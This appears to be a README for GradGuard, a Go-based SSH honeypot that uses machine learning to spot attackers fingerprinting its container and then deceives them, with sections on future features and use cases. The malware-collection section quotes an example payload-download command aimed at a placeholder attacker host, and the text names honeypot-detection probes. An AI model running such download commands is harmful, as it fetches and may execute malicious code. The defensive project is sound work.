# What is GradGuard and why?:

GradGuard is a deceptive SSH honeypot, a fake SSH server that looks real to attackers. When someone connects, they get a genuine Linux shell inside a Docker container. They think they've compromised a real system. Meanwhile, every command they type is logged, analyzed, and classified in real time.
The core insight the project is built around: sophisticated attackers don't just brute force, they first fingerprint the environment to check if they're in a honeypot, VM, or container before doing anything meaningful. If they detect a honeypot, they leave without revealing their real tools or intentions. GradGuard's job is to detect that fingerprinting attempt and silently alter the container environment to fool them into thinking they're on real bare metal, so they stay longer and expose more.


# Why use golang?

- Compile whole project in a single static binary file with no runtime dependencies, easy to deploy it anywhere.
- `golang.org/x/crypto/ssh` packge lets us build a fully custom SSH server from scratch.
- Go's goroutine model handles 100+ concurrent SSH sessions with a too little overhead.

# Why ML?

- The hardocded rule based honepot is fast and inteceptable but follows a fixed pattern a professional attacker will first use fingerprint command which will expose the honeypot.
- The ML layer learns the statistical shape of malicious session from real data (commands, ratios, timing, suspicion trajectories) and can generalize to patterns the hardcoded rules never anticipated. 
- Rule based honepot catch known pattern instantly, ML catches behavioral anomalies the rules miss.

# Why not just use the existing honeypots?

Tools like Cowrie, Kippo, and HoneySSH exist and are widely deployed. The problem is they're well-known. Security researchers and malware authors have fingerprinted them, their response patterns, fake filesystem layouts, and behavior under certain commands are documented publicly. A sophisticated attacker runs a single `uname -a` or checks `/proc/1/cgroup` and immediately knows they're in Cowrie.
GradGuard is custom-built and unknown. Its SSH banner spoofs real OpenSSH. Its container responds to fingerprint commands with altered output. There's no public signature to match against.

# How was ML trained?

`ssh_anomaly_dataset.csv`, `brute_force_data.json` and synthetic samples
The model trains fresh on every run from `Dataset/training_samples.json` plus live logs, so it improves automatically as the honeypot captures more real sessions.

# Future Scope:

- Adaptive Personality Engine
    
    Right now the fake container is always a generic Ubuntu server. The system could detect what the attacker is looking for, are they targeting web servers? databases? IoT devices? — and dynamically reshape the environment to match. If they run mysql --version, suddenly there's a MySQL server. If they check for Apache configs, /etc/apache2 exists. The honeypot becomes whatever the attacker wants to find, keeping them engaged longer.

- Attacker Re-identification Across Sessions
    
    The same attacker often reconnects from different IPs using VPNs or botnets. By fingerprinting their behavioral pattern, which commands they run first, in what order, at what timing, you can identify the same human operator across multiple sessions even when the IP changes. This is behavioral biometrics applied to attackers.

- Automated Counterintelligence

    When the system identifies a brute force attack, it could automatically submit the attacker's IP to public blocklists like AbuseIPDB, or feed it into firewall rules across the organization's real infrastructure in real time. Detection becomes active defense.`

- Malware Collection

    When an attacker tries to download a payload `wget http://evil.com/backdoor` the system could actually fetch and sandbox that binary rather than letting the command silently fail. Every exploit attempt becomes a malware sample collection opportunity.

-  Multi-Protocol Honeypot

    SSH is one attack surface. The same behavioral analysis pipeline could extend to Telnet, RDP, FTP, HTTP admin panels, and database ports. A single attacker often probes multiple protocols, correlating their behavior across protocols gives a much richer profile.

- Federated Learning Across Deployments

    If 100 organizations each run GradGuard, they each see a slice of global attack traffic. With federated learning, each instance can contribute to a shared model without sharing raw session data, privacy-preserving collective intelligence. The model improves from global attack patterns while each deployment keeps its logs local.

- LLM-Powered Fake Shell Responses

    Right now the attacker gets a real container shell. A future version could intercept commands and have an LLM generate convincing fake responses, fake database dumps, fake source code, fake configuration files, that look real enough to keep the attacker engaged for hours while revealing nothing and logging everything. The attacker thinks they're exfiltrating real data. They're exfiltrating hallucinated decoys.

- Risk Scoring Integration with SIEM

    Export detection events in real time to Splunk, Elastic SIEM, or Microsoft Sentinel. GradGuard becomes a data source in the organization's existing security operations workflow rather than a standalone tool.

- Legal Evidence Package Generation

    When a high-confidence attack session is detected, automatically generate a forensic package, timestamped logs, attacker IP with geolocation, session recording, commands run, ML classification confidence, formatted for submission to law enforcement or legal proceedings.


# Where can this project be used?

- Academic and Government Research

    Understanding how attackers behave what commands they run first, how long they stay, what they look for is valuable security research. GradGuard generates labeled behavioral datasets automatically. Every session is a real attacker behavioral sample that researchers can study

- Cloud Infrastructure Protection

    Every cloud provider: AWS, Azure, GCP has thousands of exposed SSH endpoints. Deploying GradGuard as a decoy alongside real infrastructure creates a tripwire. Any connection to port 2222 on a honeypot IP is immediately suspicious since legitimate users know where real services are. The moment someone connects, you know it's an attacker and you start profiling them before they reach anything real.

- Threat Intelligence Collection

    Every session GradGuard captures is a data point, real attacker IPs, real passwords being tried, real fingerprinting techniques, real exploit commands. At scale, running 50 honeypots across different cloud regions generates a continuous feed of real-world attack intelligence. This is exactly what companies like Recorded Future, Mandiant, and Crowdstrike sell as threat intelligence feeds. GradGuard could be the collection engine for such a feed.

- Enterprise Network Deception

    Large enterprises use "deception technology", fake servers, fake credentials, fake data, to detect lateral movement by attackers who've already breached the perimeter. GradGuard fits directly into this category. An attacker who gets past the firewall and starts scanning internal SSH services hits a honeypot, gets profiled, and triggers an alert all before touching anything real.

- ISP and Hosting Provider Security

    Companies like Cloudflare, DigitalOcean, and OVH deal with attack traffic at massive scale. Deploying honeypots in their IP ranges helps them identify compromised machines on their own network machines that are attacking their honeypots are machines that need to be taken offline.

